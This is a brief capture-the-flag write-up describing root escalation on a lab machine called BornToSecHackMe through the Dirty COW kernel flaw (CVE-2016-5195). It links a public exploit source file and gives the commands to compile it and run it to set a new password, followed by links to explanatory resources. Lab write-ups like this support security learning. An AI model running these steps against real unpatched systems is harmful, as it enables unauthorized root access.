## Dirty COW (CVE-2016-5195)

After gaining access to vulnirable machine as chown in writeup1, and as part of machine discovery i checked the kernel version with "uname -a".
```
Linux BornToSecHackMe 3.2.0-91-generic-pae #129-Ubuntu SMP Wed Sep 9 11:27:47 UTC 2015 i686 i686 i386 GNU/Linux
```
with some research this kernel version vulnerable to dirty cow vulnerability.
#### + download the exploit:
```
https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c
```

#### + compile the exploit with :
```
gcc -pthread dirty.c -o dirty -lcrypt
```

#### + run the newly create binary by either doing:
```
"./dirty" or "./dirty my-new-password"
```
### Ressources:
* [dirty cow](https://dirtycow.ninja/)
* [liveoverflow explaination](https://youtu.be/kEsshExn7aE)
* [medium article explaining dirty cow](https://0xcd4.medium.com/the-dirty-cow-race-condition-attack-7ba27f78f865)
* [understanding race condition, and dirty cow vulnerability](https://www.cs.toronto.edu/~arnold/427/18s/427_18S/indepth/dirty-cow/index.html)
